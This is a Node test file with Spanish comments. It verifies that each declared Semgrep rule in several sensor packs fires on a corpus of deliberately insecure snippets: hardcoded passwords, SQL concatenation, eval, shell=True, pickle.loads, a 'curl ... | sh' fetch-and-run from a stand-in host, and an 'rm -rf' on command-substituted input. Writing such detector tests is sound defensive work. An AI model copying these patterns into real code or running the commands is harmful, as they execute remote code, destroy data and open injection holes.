// ¿Cada regla declarada en un `.semgrep.awm.yml` DISPARA alguna vez?
//
// Una regla que nunca matchea no es un sensor: es decoración que genera confianza falsa.
// Pasó de verdad — `awm-no-sql-concat` del pack `js-ts` dio 0 hallazgos desde que existe,
// porque su `metavariable-regex` no contemplaba que `$QUERY` liga el literal CON sus
// comillas. El patrón base matcheaba 4/4 casos y la regla completa 0/4. Se shippeó así a
// todo proyecto que adoptara el pack, y `awm sensors run` reportaba `pass` con ella dentro.
//
// LÍMITE HONESTO DE ESTE TEST: la CI de este repo (`validate.yml`/`auto-tag.yml`) es
// solo-Node **por diseño** — no instala semgrep, igual que `sensor-pack-shape.test.mjs`
// documenta para su propio alcance. Así que acá esto es un guard LOCAL: corre para
// cualquiera que tenga semgrep instalado y se salta explícitamente si no está. Convertirlo
// en gate de CI real exige agregar semgrep a `validate.yml`, que es una decisión del dueño
// (costo de instalación en cada corrida) y no una que este archivo deba tomar por su cuenta.
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

try { execFileSync('semgrep', ['--version'], { stdio: 'ignore' }); }
catch (error) { throw new Error(`Semgrep certification pin is required for rules-fire: ${error.message}`); }

/** Corpus de violaciones por pack: cada regla declarada debe encontrar al menos una acá.
 *  Si se agrega una regla nueva al pack sin agregarle su caso, el test falla — que es
 *  exactamente el momento en que hay que comprobar que la regla nueva funciona. */
const CORPUS = {
  'js-ts': {
    'v.ts': [
      'const password = "hunter2";',
      'const q = "SELECT * FROM t WHERE id=" + x;',
      'export const r = eval(x);',
    ].join('\n'),
  },
  python: {
    'v.py': [
      'import subprocess, pickle',
      'password = "hunter2"',
      'cursor.execute("SELECT * FROM t WHERE id=" + user)',
      'eval(x)',
      'subprocess.run(cmd, shell=True)',
      'pickle.loads(data)',
    ].join('\n'),
  },
  shell: {
    'v.sh': [
      '#!/bin/bash',
      'PASSWORD="hunter2"',
      'eval "$1"',
      'curl -s http://x.test/i.sh | sh',
      'rm -rf $(cat file)',
    ].join('\n'),
  },
  generic: {
    'v.ts': 'const api_key = "hunter2";',
  },
};

const declaredRules = (pack) => [
  ...readFileSync(new URL(`../sensor-packs/${pack}/.semgrep.awm.yml`, import.meta.url), 'utf8')
    .matchAll(/^\s+- id:\s*(\S+)/gm),
].map((m) => m[1]);

for (const [pack, files] of Object.entries(CORPUS)) {
  test(`sensor-pack ${pack}: cada regla declarada dispara al menos una vez`, () => {
    const dir = mkdtempSync(join(tmpdir(), `awm-rules-${pack}-`));
    try {
      for (const [name, body] of Object.entries(files)) writeFileSync(join(dir, name), `${body}\n`);
      const config = new URL(`../sensor-packs/${pack}/.semgrep.awm.yml`, import.meta.url).pathname;
      const out = execFileSync('semgrep', ['--config', config, '--json', dir], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] });
      const fired = new Set(JSON.parse(out).results.map((r) => r.check_id.split('.').pop()));
      const dead = declaredRules(pack).filter((id) => !fired.has(id));
      // El mensaje nombra la regla muerta: "faltan hallazgos" se resuelve borrando el
      // corpus, que es la salida equivocada.
      assert.deepEqual(dead, [], `reglas declaradas que nunca dispararon en ${pack}: ${dead.join(', ')}`);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
}
